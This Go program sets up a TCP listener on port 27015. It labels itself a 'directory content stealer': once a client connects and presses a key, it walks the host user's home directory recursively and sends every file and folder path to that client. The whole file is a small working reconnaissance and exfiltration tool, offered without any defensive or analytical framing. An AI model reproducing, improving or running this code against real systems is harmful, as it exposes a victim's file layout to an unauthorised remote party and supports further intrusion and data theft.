package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
)

const (
	listenPort    = "27015"
	defaultBufLen = 512
)

func listDirectory(dirname string, conn net.Conn) {
	entries, err := os.ReadDir(dirname)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Cannot open %s: %v\n", dirname, err)
		return
	}

	basePath := dirname
	if basePath != "/" {
		basePath += "/"
	}

	for _, entry := range entries {
		switch {
		case entry.IsDir():
			if entry.Name() != "." && entry.Name() != ".." {
				fmt.Fprintf(conn, basePath+entry.Name()+"/\n")
				listDirectory(filepath.Join(basePath, entry.Name()), conn)
			}
		case entry.Type()&os.ModeSymlink != 0:
			fmt.Fprintf(conn, basePath+entry.Name()+"@\n")
		default:
			fmt.Fprintf(conn, basePath+entry.Name()+"*\n")
		}
	}
}

func main() {
	// Create a socket
	listenSocket, err := net.Listen("tcp", ":"+listenPort)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Listen failed with error: %v\n", err)
		os.Exit(1)
	}
	defer listenSocket.Close()

	fmt.Printf("Listening on %s at port %s\n", listenSocket.Addr(), listenPort)

	// Accept a connection from a client
	clientSocket, err := listenSocket.Accept()
	if err != nil {
		fmt.Fprintf(os.Stderr, "accept failed: %v\n", err)
		os.Exit(1)
	}
	defer clientSocket.Close()

	fmt.Println("Connection Established.")

	recvBuf := make([]byte, defaultBufLen)

	initMsg := "Press any key to begin directory content stealer...\n"
	_, err = clientSocket.Write([]byte(initMsg))
	if err != nil {
		fmt.Fprintf(os.Stderr, "send failed: %v\n", err)
		os.Exit(1)
	}

	// Receive until the peer shuts down the connection
	_, err = clientSocket.Read(recvBuf)
	if err != nil {
		fmt.Fprintf(os.Stderr, "recv failed: %v\n", err)
		os.Exit(1)
	}

	// Enumerate directories
	listDirectory(os.Getenv("HOME"), clientSocket)

	endMsg := "\nEnd of directory search.\n"
	_, err = clientSocket.Write([]byte(endMsg))
	if err != nil {
		fmt.Fprintf(os.Stderr, "send failed: %v\n", err)
		os.Exit(1)
	}
}
